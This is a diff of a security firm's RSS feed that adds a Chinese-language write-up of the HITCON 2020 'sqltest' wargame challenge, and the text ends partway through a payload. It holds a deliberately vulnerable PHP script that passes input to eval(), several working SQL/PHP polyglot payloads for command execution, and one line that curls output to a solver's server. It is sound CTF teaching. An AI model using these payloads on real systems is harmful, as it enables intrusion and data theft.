@@ -4,11 +4,425 @@
         <title>DEVCORE 戴夫寇爾</title>
         <description>DEVCORE 戴夫寇爾 - 滲透測試服務、資安教育訓練、資安顧問服務</description>
         <link>https://devco.re</link>
-        <lastBuildDate>Tue, 13 Oct 2020 19:19:38 +0800</lastBuildDate>
-        <pubDate>Tue, 13 Oct 2020 19:19:38 +0800</pubDate>
+        <lastBuildDate>Fri, 30 Oct 2020 22:03:00 +0800</lastBuildDate>
+        <pubDate>Fri, 30 Oct 2020 22:03:00 +0800</pubDate>
         <ttl>1800</ttl>
         <atom:link href="https://devco.re/rss" rel="self" type="application/rss+xml" />
 
+
+        <item>
+                <title>DEVCORE Wargame at HITCON 2020</title>
+                <description>&lt;style type=&quot;text/css&quot;&gt;
+    table {
+        display: block;
+        width: 100%;
+        overflow: auto;
+        word-break: normal;
+        word-break: keep-all;
+        font-size: smaller;
+    }
+
+    table th {
+        font-weight: bold
+    }
+
+    table th,
+    table td {
+        padding: 5px 11px;
+        border: 1px solid #ddd;
+    }
+
+    table tr {
+        background-color: #fff;
+        border-top: 1px solid #ccc;
+    }
+
+    table tr:nth-child(2n) {
+        background-color: #f8f8f8;
+    }
+&lt;/style&gt;
+
+&lt;p&gt;搭晚安～一年一度的資安圈大拜拜活動之一 HITCON 2020 在約一個月前順利落幕啦，今年我們照舊在攤位準備了幾道小小的 Wargame 給會眾朋友們挑戰自身技術，並同樣準備了幾份精美小禮物送給挑戰成功的朋友們。&lt;/p&gt;
+
+&lt;p&gt;總計活動兩天間有登入並提交至少一把 flag 的人數為 92 人，非常感謝大家踴躍地參與，這次未能成功在時間內完成挑戰而未領到小禮物的朋友們也別太灰心，為了能更多的回饋社群，所以我們決定寫一篇技術文章介紹本次 Wargame 的其中一道開放式題目&lt;code class=&quot;highlighter-rouge&quot;&gt;sqltest&lt;/code&gt;，為此我們在活動後詢問了所有解題的人，收集了大家的解法與思路，並將在文章的接下來一一為大家介紹！&lt;/p&gt;
+
+&lt;h2 id=&quot;sqltest-題目說明&quot;&gt;sqltest 題目說明&lt;/h2&gt;
+
+&lt;p&gt;這道題目主要核心的部分就這 3 個檔案：Dockerfile、readflag.c 和 index.php。讓我們先看看前兩個檔案，可以從下方的 Dockerfile 中先觀察到 flag 被放置在檔案 /flag 之中，但權限被設定為僅有 root 可以讀取，另外準備了具有 setuid 權限的執行檔 /readflag，讓任何人均可在執行此檔案時偽裝成 root 身分，而 /readflag 的原始碼就如下方 readflag.c 所示，很單純的讀取並輸出 /flag 檔案內容，這個配置就是一個很標準以 getshell 為目標的 Wargame 題目。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Dockerfile&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-dockerfile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; php:7.4.10-apache&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# setup OS env&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;apt update &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;docker-php-ext-install mysqli
+&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;docker-php-ext-enable mysqli
+
+&lt;span class=&quot;c&quot;&gt;# setup web application&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; ./src/ /var/www/html/&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# setup flag&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DEVCORE{flag}&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /flag
+&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;0400 /flag
+&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;root:root /flag
+&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; readflag.c /readflag.c&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /readflag /readflag.c
+&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;4555 /readflag
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;readflag.c&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;seteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat /flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;上述前半部為環境的佈置，真正題目的開始則要見下方 index.php，其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;$_REQUEST&lt;/code&gt; 是我們可以任意控制的參數，題目除了 isset 外並無其他任何檢查，隨後第 8 行中參數被帶入 SQL 語句作執行，如果 SQL 執行成功並且有查詢到資料，就會進入 15 行開始的處理，來自 &lt;code class=&quot;highlighter-rouge&quot;&gt;$_REQUEST&lt;/code&gt; 的 &lt;code class=&quot;highlighter-rouge&quot;&gt;$column&lt;/code&gt; 變數再次被使用並傳入 eval 作執行，這樣看下來題目的解題思路就很清楚了，我們需要構造一個字串，同時為合法的 SQL 語句與 PHP 語句，讓 SQL 執行時有回傳值且 PHP 執行時能夠執行任意系統指令，就能 getshell 並呼叫 /readflag 取得 flag！&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;index.php&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;column&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;No input&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;column&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;select &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; from mytable where id =&#39;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&#39;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysqli_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;mysql&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;user&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;youtu.be/l11uaEjA-iI&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;sqltest&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli_num_rows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli_fetch_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;output = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;row-&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;Database error&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;出題者解法&quot;&gt;出題者解法&lt;/h2&gt;
+
+&lt;p&gt;身為出題者，當然必須先拋磚一下才能夠引玉～&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;exploit:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column={passthru(&#39;/readflag&#39;)}&amp;amp;id=1
+
+SQL: SELECT {passthru(&#39;/readflag&#39;)} FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;{passthru(&#39;/readflag&#39;)};
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;這個解法利用了 MySQL 一個相容性的特性，&lt;code class=&quot;highlighter-rouge&quot;&gt;{identifier expr}&lt;/code&gt; 是 ODBC Escape 語法，MySQL 相容了這個語法，使得在語句中出現時不會導致語法錯誤，因此我們可以構造出 &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT {passthru &#39;/readflag&#39;} FROM mytable WHERE id = &#39;1&#39;&lt;/code&gt; 字串仍然會是合法的 SQL 語句，更進一步地嘗試將 ODBC Escape 中的空白移除改以括號包夾字串的話，會變成 &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT {passthru(&#39;/readflag&#39;)} FROM mytable WHERE id = &#39;1&#39;&lt;/code&gt;，由於 MySQL 提供的語法彈性，此段語句仍然會被視為合法並且可正常執行得到相同結果。&lt;/p&gt;
+
+&lt;p&gt;接著再看進到 eval 前會構造出這樣的 PHP 語句：&lt;code class=&quot;highlighter-rouge&quot;&gt;$output = $row-&amp;gt;{passthru(&#39;/readflag&#39;)}&lt;/code&gt;，由於 PHP 在語法上也提供了極大的彈性，使得我們可以利用 &lt;code class=&quot;highlighter-rouge&quot;&gt;$object-&amp;gt;{ expr }&lt;/code&gt; 這樣的語法將 expr 敘述句動態執行完的結果作為物件屬性名稱去存取物件的屬性，因此結果就會呼叫 passthru 函式執行系統指令。&lt;/p&gt;
+
+&lt;p&gt;這邊補充一個冷知識，當想到系統指令時，大家直覺可能會想到使用 system 函式，但是 MySQL 在 8.0.3 中將 system 加入關鍵字保留字之中，而這題目環境是使用 MySQL 8.0 架設的，所以如果使用 system 的話反而會失敗唷！&lt;/p&gt;
+
+&lt;h2 id=&quot;來自會眾朋友們的解法&quot;&gt;來自會眾朋友們的解法&lt;/h2&gt;
+
+&lt;p&gt;由於朋友們踴躍提交的解法眾多，所以我們將各解法簡單做了分組，另外提醒一下，以下順序只是提交的先後時間差，並無任何優劣，能取得 flag 的解法都是好解法！接下來就讓我們進行介紹吧。&lt;/p&gt;
+
+&lt;h3 id=&quot;odbc-escape&quot;&gt;ODBC Escape&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;by Mico (https://www.facebook.com/MicoDer/):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column={exec(%27curl%20http://Mico_SRV/?`/readflag`%27)};%23&amp;amp;id=1
+
+SQL: SELECT {exec(&#39;curl http://Mico_SRV/?`/readflag`&#39;)};# FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;{exec(&#39;curl http://Mico_SRV/?`/readflag`&#39;)};#;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;這個解法與出題者的十分類似，但沒有使用可以直接輸出結果的 passthru 而是改用 exec，接著透過 curl 把結果回傳至自己的伺服器，據本人說法是因為「覺得駭客就該傳些什麼回來自己Server XD 」XD。&lt;/p&gt;
+
+&lt;h3 id=&quot;comment-everywhere&quot;&gt;Comment Everywhere&lt;/h3&gt;
+
+&lt;p&gt;幾乎所有程式語言都有註解符號可以讓開發人員在程式碼中間加上文字說明，以便下一個開發人員接手時可以快速理解這段程式碼的意義。當然 SQL 與 PHP 也有各自的註解符號，但它們所支援的符號表示稍微有些差異，而這小差異就可以幫助我們達成目的。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by LJP (https://ljp-tw.github.io/blog/)&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id%0a-- /*%0a-- */ ; system(&#39;/readflag&#39;);%0a&amp;amp;id=1
+
+SQL: SELECT id
+     -- /*
+     -- */ ; system(&#39;/readflag&#39;);
+     FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = id
+     -- /*
+     -- */ ; system(&#39;/readflag&#39;);
+     ;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;這個解法看似複雜，本質上其實很單純，就是利用兩個語言支援不同註解符號的特性。對於 SQL 而言，&lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; 是註解符號，會無視後方所有到換行為止的文字，所以每一行以 &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; 開頭的字串，SQL 是看不見的。接著來看 PHP，對於 PHP 而言，&lt;code class=&quot;highlighter-rouge&quot;&gt;/* 任何字串 */&lt;/code&gt; 這是註解的表示方式，開頭結尾由 / 與 * 組成，中間被包夾的字串是看不見的，並且支援換行，而 &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; 在 PHP 之中則代表遞減運算子，所以如 &lt;code class=&quot;highlighter-rouge&quot;&gt;$output --&lt;/code&gt; 字串其實是在對 $output 進行減 1 的操作。綜合上面特性，對於上面的解法，其實只有 PHP 看見的第三行 ` ; system(‘/readflag’);` 會認為是需要執行的程式碼，其餘部分不論是 SQL 還是 PHP 都以為是註解的字串而無視，因此可以順利執行取得 flag。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by ankleboy (https://www.facebook.com/profile.php?id=100001963625238):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name%20/*!%20from%20mytable%20*/%20--%20;%20system(%22/readflag%22)&amp;amp;id=1
+
+SQL: SELECT name /*! from mytable */ -- ; system(&quot;/readflag&quot;) FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;name /*! from mytable */ -- ; system(&quot;/readflag&quot;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;此解法也是同樣運用註解，但使用的註解符號似乎稍微特殊，&lt;code class=&quot;highlighter-rouge&quot;&gt;/* */&lt;/code&gt; 除了 PHP 之外，MySQL 也同樣支援此允許多行的註解符號，但假如多上一個驚嘆號 &lt;code class=&quot;highlighter-rouge&quot;&gt;/*! */&lt;/code&gt;，事情就又稍微不同了，這是 MySQL 特有的變種註解符號，在此符號中的字串，仍然會被 MySQL 當成 SQL 的一部分執行，但在其他 DBMS 之中，因為是 &lt;code class=&quot;highlighter-rouge&quot;&gt;/*&lt;/code&gt; 開頭就會認為它就是單純的註解文字而忽視，讓開發人員能撰寫可 portable 的程式碼。因此就能製造出一串註解文字可被 MySQL 看見但無法被 PHP 看見，強制在註解文字裡讓 SQL 構造合法語句，再利用 &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; 註解閉合所有冗贅 SQL 語句，緊接著 &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; 後就能撰寫任意 PHP 執行碼。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by FI:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`%23?&amp;gt;&amp;amp;id=1
+
+SQL: SELECT id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&amp;gt; FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&amp;gt;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;同樣是利用 &lt;code class=&quot;highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; 註解符號強行構造合法查詢，不過有趣的是，MySQL 支援 &lt;code class=&quot;highlighter-rouge&quot;&gt;#&lt;/code&gt; 單行的註解符號，此註解符號同樣也被 PHP 支援，所以不會導致 PHP 語法錯誤，最後還多了 &lt;code class=&quot;highlighter-rouge&quot;&gt;?&amp;gt;&lt;/code&gt; 強行結束 PHP 程式區塊，冷知識是如果程式碼是 PHP 程式區塊內最後一行的話，不加 &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; 並不會導致語法錯誤唷 :P&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by tree:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=null--+.$output=exec(&#39;/readflag&#39;)&amp;amp;id=
+
+SQL: SELECT null-- .$output=exec(&#39;/readflag&#39;) FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;null-- .$output=exec(&#39;/readflag&#39;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;也是用了 &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; 把 PHP 程式碼的部分在 SQL 裡面遮蔽起來，利用了 null 關鍵字讓 SQL 查詢有回傳結果，但在 PHP 之中卻變成 &lt;code class=&quot;highlighter-rouge&quot;&gt;$row-&amp;gt;null&lt;/code&gt; 對 $row 物件存取名為 null 的屬性，使得 PHP 也能合法執行，最後將指令執行結果覆蓋 $output 變數，讓題目幫助我們輸出結果。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by cebrusfs (https://www.facebook.com/menghuan.yu):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=NULL;%20--%20$b;var_dump(exec(%22/readflag%22))&amp;amp;id=1
+
+SQL: SELECT column=NULL; -- $b;var_dump(exec(&quot;/readflag&quot;)) FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;column=NULL; -- $b;var_dump(exec(&quot;/readflag&quot;));
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;此解法也是類似的思路，運用 &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; 閉合再湊出合法 PHP 程式碼，最後直接使用 var_dump 強制輸出 exec 的執行結果。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by Jason3e7 (https://github.com/jason3e7):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=NULL;-- $id %2b system(&#39;/readflag&#39;);%23&amp;amp;id=1
+
+SQL: SELECT NULL;-- $id + system(&#39;/readflag&#39;);# FROM mytable WHERE id = &#39;1&#39;
+PHP: $output = $row-&amp;gt;NULL;-- $id + system(&#39;/readflag&#39;);#;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;這也是相似的思路，有趣的是 &lt;code class=&quot;highlighter-rouge&quot;&gt;-- $id&lt;/code&gt; 這個部分，大家一定記得 &lt;code class=&quot;highlighter-rouge&quot;&gt;$id --&lt;/code&gt; 是遞減運算子，但有時可能會忘記 &lt;code class=&quot;highlighter-rouge&quot;&gt;-- $id&lt;/code&gt; 也同樣是遞減運算子，所以這個 &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; 會使得 MySQL 認為是註解，PHP 卻仍認為是遞減運算子並正常執行下去。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;by shoui:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&#39;/readflag&#39;).&quot;;&quot;;&amp;amp;id=1
+
